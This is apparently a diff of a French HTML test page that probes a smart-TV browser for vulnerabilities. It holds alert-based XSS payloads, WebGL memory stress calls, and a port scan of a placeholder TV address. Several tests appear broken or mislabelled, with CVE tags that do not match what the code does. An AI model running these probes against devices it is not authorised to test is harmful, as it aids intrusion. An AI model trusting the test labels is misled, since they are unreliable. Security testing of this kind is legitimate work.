@@ -1,26 +1,174 @@
 <!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <title>Exploit Tests pour TV</title>
+    <style>
+        body { font-family: Arial, sans-serif; margin: 20px; }
+        button { margin: 5px; padding: 10px; cursor: pointer; }
+    </style>
+</head>
 <body>
-  <canvas id="canvas"></canvas>
-  <script>
-    var canvas = document.getElementById('canvas');
-    var gl = canvas.getContext('webgl2'); // Test WebGL 2.0
-    if (gl) {
-      var ext = gl.getExtension('OES_vertex_array_object');
-      var vao = ext.createVertexArrayOES();
-      var buffer = gl.createBuffer();
-      gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
-      var data = new Float32Array(1000000); // Buffer excessif
-      try {
-        gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
-        alert('Test buffer overflow');
-      } catch (e) {
-        alert('Erreur : ' + e.message);
-      }
-      // Tentative use-after-free
-      gl.deleteBuffer(buffer);
-      gl.bindBuffer(gl.ARRAY_BUFFER, buffer); // Réutilisation
-      alert('Test use-after-free');
-    }
-  </script>
+    <h2>Tests d'exploits pour le navigateur TV</h2>
+    <p>Clique sur les boutons pour tester des vulnérabilités. Résultats dans des alertes.</p>
+
+    <!-- Test XSS via JavaScript URI (CVE-2012-6461) -->
+    <button onclick="testXSSJavaScriptURI()">Test XSS JavaScript URI</button>
+    <script>
+        function testXSSJavaScriptURI() {
+            try {
+                var img = document.createElement('img');
+                img.src = 'javascript:alert("XSS via URI réussi")';
+                document.body.appendChild(img);
+            } catch (e) {
+                alert('XSS bloqué: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test WebGL Buffer Overflow (CVE-2018-17462) avec WebGL 1.0/2.0 -->
+    <button onclick="testWebGLBufferOverflow()">Test WebGL Buffer Overflow</button>
+    <script>
+        function testWebGLBufferOverflow() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl'); // WebGL 1.0 ou 2.0
+                if (gl) {
+                    var buffer = gl.createBuffer();
+                    gl.bindBuffer(gl.ARRAY_BUFFER, buffer);
+                    var data = new Float32Array(10000000); // Buffer énorme
+                    gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
+                    alert('WebGL actif, overflow testé (crash si vulnérable)');
+                } else {
+                    alert('WebGL non pris en charge');
+                }
+            } catch (e) {
+                alert('Erreur WebGL: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test XSS via UTF-8 Encoding (CVE-2014-3167) -->
+    <button onclick="testXSSUTF8()">Test XSS UTF-8</button>
+    <script>
+        function testXSSUTF8() {
+            try {
+                var script = document.createElement('script');
+                script.text = decodeURIComponent('%u0061%u006c%u0065%u0072%u0074%u0028%u0022XSS%u0020UTF-8%u0020r%C3%A9ussi%u0022%u0029');
+                document.body.appendChild(script);
+            } catch (e) {
+                alert('XSS bloqué: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test SVG Malformed Exploit (CVE-2012-1951) -->
+    <button onclick="testSVGExploit()">Test SVG Malformed</button>
+    <script>
+        function testSVGExploit() {
+            try {
+                var img = document.createElement('img');
+                img.src = 'data:image/svg+xml,<svg onload="alert(\'SVG Exploit réussi\')"></svg>';
+                document.body.appendChild(img);
+            } catch (e) {
+                alert('SVG bloqué: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test Port Scanning et Interaction -->
+    <button onclick="testPortScan()">Test Scan Ports</button>
+    <script>
+        function testPortScan() {
+            try {
+                var ports = [80, 443, 8080, 1935, 554, 5000, 3000]; // 7 ports ouverts
+                var ip = '<IP_de_la_TV>'; // Remplace par l'IP réelle
+                var results = [];
+                ports.forEach(port => {
+                    var img = new Image();
+                    img.src = `http://${ip}:${port}/test`;
+                    img.onload = () => results.push(`Port ${port}: Réponse`);
+                    img.onerror = () => results.push(`Port ${port}: Pas de réponse`);
+                });
+                setTimeout(() => alert(results.join('\n')), 2000);
+            } catch (e) {
+                alert('Erreur port: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test DOM Event Exploit (CVE-2012-1971) -->
+    <button onclick="testDOMEvent()">Test DOM Event Exploit</button>
+    <script>
+        function testDOMEvent() {
+            try {
+                var div = document.createElement('div');
+                div.setAttribute('onmouseover', 'alert("DOM Event Exploit réussi")');
+                document.body.appendChild(div);
+                div.dispatchEvent(new MouseEvent('mouseover'));
+            } catch (e) {
+                alert('DOM bloqué: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test WebP Memory Leak (CVE-2012-4416) -->
+    <button onclick="testWebPMemoryLeak()">Test WebP Memory Leak</button>
+    <script>
+        function testWebPMemoryLeak() {
+            try {
+                var img = document.createElement('img');
+                img.src = 'data:image/webp;base64,UklGRhIAAABXRUJQVlA4TA0AAAAvAAAAEAcQERGIiP4HAA==';
+                img.onload = () => alert('WebP chargé, potentielle fuite mémoire');
+                document.body.appendChild(img);
+            } catch (e) {
+                alert('WebP bloqué: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test Plugin DRM Interaction avec DRMDataLoaderPlugin -->
+    <button onclick="testDRMPlugin()">Test DRM Plugin</button>
+    <script>
+        function testDRMPlugin() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl'); // WebGL
+                if (gl) {
+                    var video = document.createElement('video');
+                    gl.bindTexture(gl.TEXTURE_2D, video); // Interaction avec DRMDataLoaderPlugin
+                    alert('DRM testé (vulnérable si crash ou accès)');
+                } else {
+                    alert('WebGL non pris en charge');
+                }
+            } catch (e) {
+                alert('Erreur DRM: ' + e.message);
+            }
+        }
+    </script>
+
+    <!-- Test WebGL Shader Injection (Général, basé sur Chromium 59) -->
+    <button onclick="testWebGLShaderInjection()">Test WebGL Shader Injection</button>
+    <script>
+        function testWebGLShaderInjection() {
+            try {
+                var canvas = document.createElement('canvas');
+                var gl = canvas.getContext('webgl2') || canvas.getContext('webgl');
+                if (gl) {
+                    var vertexShader = gl.createShader(gl.VERTEX_SHADER);
+                    gl.shaderSource(vertexShader, 'void main() { gl_Position = vec4(1.0); }'); // Code valide
+                    gl.compileShader(vertexShader);
+                    if (!gl.getShaderParameter(vertexShader, gl.COMPILE_STATUS)) {
+                        throw new Error(gl.getShaderInfoLog(vertexShader));
+                    }
+                    alert('Shader compilé, test injection (vulnérable si exécution malveillante)');
+                } else {
+                    alert('WebGL non pris en charge');
+                }
+            } catch (e) {
+                alert('Erreur Shader: ' + e.message);
+            }
+        }
+    </script>
 </body>
 </html>
